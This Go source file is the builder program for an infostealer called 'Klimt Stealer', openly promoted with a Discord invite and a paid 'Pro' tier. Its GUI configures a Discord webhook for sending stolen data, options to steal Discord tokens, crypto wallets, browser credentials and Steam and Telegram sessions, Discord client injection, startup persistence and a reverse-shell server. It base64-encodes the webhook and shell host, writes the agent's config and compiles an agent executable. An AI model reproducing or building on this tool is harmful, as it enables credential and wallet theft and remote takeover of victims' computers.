//go:build exclude

// This program is a simplified version with lesser functionality in comparison to the Pro version.
// See the `YHWH - Klimt Stealer` Discord for further information: https://discord.gg/GMPfKuR3Tn

package main

import (
	"os"
	"fmt"
	"math"
	"net/url"
	"os/exec"
	"strconv"
	"strings"
	"image/color"
	"encoding/base64"

	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
)

func cleanConfig() {
	os.WriteFile(config, []byte(""), 0644)
}

func colorToInt(c color.Color) int {
	r, g, b, _ := c.RGBA()

	return int(math.Round(float64((r>>8)<<16 | (g>>8)<<8 | (b >> 8))))
}

func main() {
	// Create a new Fyne application
	app := app.NewWithID("klimt")

	// Create a new window
	window := app.NewWindow("Klimt Builder - Free Version")

	// Create YHWH Discord hyperlink that open the Discord URL using the default browser
	discordURL, _ := url.Parse("https://discord.gg/GMPfKuR3Tn")
	discordHyperlink := widget.NewHyperlink("Join the Klimt Stealer Discord Server!", discordURL)

	// Create input boxes
	webhookInput := widget.NewEntry()
	webhookInput.SetPlaceHolder("Discord Webhook")

	encryptWebhookCheck := widget.NewCheck("Encrypt Webhook", func(bool) {})

	hitMessageInput := widget.NewEntry()
	hitMessageInput.SetPlaceHolder("Custom Hit Message")

	embedInputButton := widget.NewButton("Choose Embed Color", func() {
		picker := dialog.NewColorPicker("Embed Color Picker", "Please pick your color:", func(c color.Color) {
			embedColor = colorToInt(c)
		}, window)
		picker.Advanced = true
		picker.Show()
	})

	pingOnHitCheck := widget.NewCheck("Ping @everyone", func(bool) {})

	// Create checklist containers for each type of checkbox-type
	getDiscordTokensCheck := widget.NewCheck("Discord Tokens", func(bool) {})
	getWalletCredentialsCheck := widget.NewCheck("Crypto Wallets", func(bool) {})
	getBrowserCredentialsCheck := widget.NewCheck("Browser Credentials (Pro)", func(bool) {})

	getBrowserCredentialsCheck.Disable()
	systemContainer := container.NewVBox(
		getDiscordTokensCheck,
		getWalletCredentialsCheck,
		getBrowserCredentialsCheck,
	)

	getFileZillaFilesCheck := widget.NewCheck("FileZilla Files (Pro)", func(bool) {})
	getTelegramSessionCheck := widget.NewCheck("Telegram Session (Pro)", func(bool) {})
	getSteamSessionCheck := widget.NewCheck("Steam Session (Pro)", func(bool) {})

	getSteamSessionCheck.Disable()
	getTelegramSessionCheck.Disable()
	getFileZillaFilesCheck.Disable()
	systemContainer2 := container.NewVBox(
		getFileZillaFilesCheck,
		getTelegramSessionCheck,
		getSteamSessionCheck,
	)

	injectIntoDiscordCheck := widget.NewCheck("Discord Client Injection", func(bool) {})
	injectIntoBrowsersCheck := widget.NewCheck("Browser Extension Injection (Pro)", func(bool) {})
	injectIntoStartupCheck := widget.NewCheck("Set Stealer to Startup (Pro)", func(bool) {})

	injectIntoStartupCheck.Disable()
	injectIntoBrowsersCheck.Disable()
	injectionContainer := container.NewVBox(
		injectIntoDiscordCheck,
		injectIntoBrowsersCheck,
		injectIntoStartupCheck,
	)

	getScrapedFilesCheck := widget.NewCheck("Scraped Files", func(bool) {})
	getInstalledSoftwareCheck := widget.NewCheck("Installed Software", func(bool) {})
	getNetworkConnectionsCheck := widget.NewCheck("Network Connections", func(bool) {})
	scrapeContainer := container.NewVBox(
		getScrapedFilesCheck,
		getInstalledSoftwareCheck,
		getNetworkConnectionsCheck,
	)

	shellHostInput := widget.NewEntry()
	shellPortInput := widget.NewEntry()
	shellHostInput.SetPlaceHolder("Server IP (ex. 192.168.0.1)")
	shellPortInput.SetPlaceHolder("Server Port (ex. 8080)")
	shellPortInput.Disable()
	shellHostInput.Disable()

	connectToShellCheck := widget.NewCheck("Connect to Reverse Shell Server", func(bool) {
		if shellHostInput.Disabled() {
			shellHostInput.Enable()
			shellPortInput.Enable()
		} else {
			shellHostInput.Disable()
			shellPortInput.Disable()
		}
	})

	shellContainer := container.NewVBox(
		connectToShellCheck,
		shellHostInput,
		shellPortInput,
	)

	// Create a button to get config from input boxes and build the agent
	buildButton := widget.NewButton("Compile Stealer", func() {
		// Replace the config.go variable lines
		func() {
			cleanConfig()

			webhook := webhookInput.Text
			hitMessage := hitMessageInput.Text
			shellHost := shellHostInput.Text
			shellPort := shellPortInput.Text

			if encryptWebhookCheck.Checked {
				webhook = base64.StdEncoding.EncodeToString([]byte(webhook))
			}
			if shellHost != "" {
				shellHost = base64.StdEncoding.EncodeToString([]byte(shellHost))
				shellPort = base64.StdEncoding.EncodeToString([]byte(shellPort))
			}
			if pingOnHitCheck.Checked {
				if !strings.Contains(hitMessage, "@everyone") {
					hitMessage += " ||@everyone||"
				}
			}

			// Write the updated content back to the file (not a good method of building)
			err := os.WriteFile(config, []byte(fmt.Sprintf(configTemplate,
				webhook,
				strconv.FormatBool(encryptWebhookCheck.Checked),
				hitMessage,
				embedColor,

				strconv.FormatBool(connectToShellCheck.Checked),
				shellHost,
				shellPort,

				strconv.FormatBool(injectIntoDiscordCheck.Checked),
				strconv.FormatBool(injectIntoStartupCheck.Checked),
				strconv.FormatBool(injectIntoBrowsersCheck.Checked),

				strconv.FormatBool(getDiscordTokensCheck.Checked),
				strconv.FormatBool(getWalletCredentialsCheck.Checked),

				strconv.FormatBool(getBrowserCredentialsCheck.Checked),
				strconv.FormatBool(getFileZillaFilesCheck.Checked),
				strconv.FormatBool(getSteamSessionCheck.Checked),
				strconv.FormatBool(getTelegramSessionCheck.Checked),

				strconv.FormatBool(getInstalledSoftwareCheck.Checked),
				strconv.FormatBool(getNetworkConnectionsCheck.Checked),
				strconv.FormatBool(getScrapedFilesCheck.Checked),
			)), 0644)
			if err != nil {
				popup := dialog.NewInformation("Builder", fmt.Sprintf("Build Failed!\nError: %e", err), window)
				popup.Show()
				return
			}
		}()

		// Build the agent directory
		func() {
			cmd := exec.Command("go", "build", "-o", "build/agent.exe", "./agent")
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			err := cmd.Run()
			if err != nil {
				popup := dialog.NewInformation("Builder", fmt.Sprintf("Build Failed!\nError: %e", err), window)
				popup.Show()
			} else {
				popup := dialog.NewInformation("Builder", "Build Succesful!\nbuild/agent.exe", window)
				popup.Show()
			}
		}()
	})


	// Create a container to hold the input boxes and button
	content := container.NewVBox(
		container.NewVBox(discordHyperlink),

		widget.NewLabel("Webhook"),
		webhookInput,
		encryptWebhookCheck,

		widget.NewLabel("Embed"),
		hitMessageInput,
		embedInputButton,
		pingOnHitCheck,

		widget.NewLabel("The following functions will increase the runtime of the stealer"),
		container.NewAppTabs( // Tabs
			container.NewTabItem("Stealing", container.NewHBox(systemContainer, systemContainer2)),
			container.NewTabItem("Injection", injectionContainer),
			container.NewTabItem("Scraping", scrapeContainer),
			container.NewTabItem("Reverse Shell", shellContainer),
		),
		buildButton,
	)

	// Set the window content to the container box
	window.SetContent(content)

	// Show the window and run the builder application
	window.ShowAndRun()
}

var (
	embedColor     = 0
	config         = "./agent/config.go"
	configTemplate = `// DO NOT EDIT THIS FILE!

package main

// webhook related
var webhookUrl = "%s"
var webhookEncrypted = %s
var hitMessage = "%s"

// embed color (0-16777215 are valid)
var embedColor = %d

// shell related
var reverseShell = %s
var reverseShellHost = "%s"
var reverseShellPort = "%s"

// injection related
var injectIntoDiscord = %s // In Development (Releasing Soon)
var injectIntoStartup = %s // Pro Version
var injectIntoBrowsers = %s // Pro Version

// enable/disable heavy-load stealing functions (can increase program runtime considerably)
var getDiscordTokens = %s
var getWalletCredentials = %s
var getBrowserCredentials = %s // Pro Version
var getFileZillaServers = %s // Pro Version
var getSteamSession = %s // Pro Version
var getTelegramSession = %s // Pro Version

var getInstalledSoftware = %s
var getNetworkConnections = %s
var getScrapedFiles = %s`
)
